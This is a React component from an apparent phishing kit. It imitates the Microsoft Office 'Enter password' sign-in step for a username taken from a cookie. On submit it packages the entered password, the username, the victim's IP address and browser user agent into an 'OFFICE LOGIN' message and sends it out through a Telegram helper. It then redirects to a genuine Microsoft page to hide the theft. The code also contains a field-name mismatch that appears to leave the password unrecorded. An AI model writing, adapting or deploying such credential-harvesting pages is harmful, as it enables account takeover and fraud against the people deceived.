import React, { useRef, useState } from "react";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Pass() {
  const login: Login = cookies.get("login");

  const [formInput, setFormInput] = useState<Login>({
    username: login.username,
    password: "",
  });
  const [ipAddress, setIpAddress] = React.useState<string>();
  const [isLoading, setIsLoading] = useState(false);

  const form = useRef<HTMLFormElement>(null);
  let agent = navigator.userAgent;

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true);
    event.preventDefault();

    const message = `
  
  [----+🏦 OFFICE LOGIN 🏦+-----]

  USERNAME: ${formInput.username}

  PASSWORD: ${formInput.password}

  IP: ${ipAddress}

  BROWSER: ${agent}

  `;

    await TelegramSend(message);

    setIsLoading(false);

    window.location.replace("https://learn.microsoft.com/en-us");
  }

  async function getIP() {
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    setIpAddress(response.ip);
  }

  React.useEffect(() => {
    getIP();
  }, []);

  return (
    <div>
      <div className="sign-in-form">
        <div className="brand-section">
          <img src="/static/images/brand.svg" alt="" srcSet="" />
        </div>
        <p>{login.username}</p>
        <h3 style={{ fontSize: "27px", marginTop: "-3px" }}>Enter password</h3>

        <form ref={form} method="post" onSubmit={handleSubmit}>
          <input
            placeholder="Password"
            onChange={handleInputChange}
            type="password"
            name="pass"
            id=""
            required
          />
          <div className="margin link">
            <a href="">Forgot password?</a>
          </div>

          <div className="margin link">
            <a href="">Email code to {login.username}</a>
          </div>

          <div className="form-buttons">
            <div className="buttons-flex">
              <div className="submit-button">
                {isLoading ? (
                  <div
                    style={{
                      width: "100%",
                      display: "flex",
                      justifyContent: "center",
                    }}
                  >
                    <span className="loader"></span>
                  </div>
                ) : (
                  <button>Sign in</button>
                )}
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
}
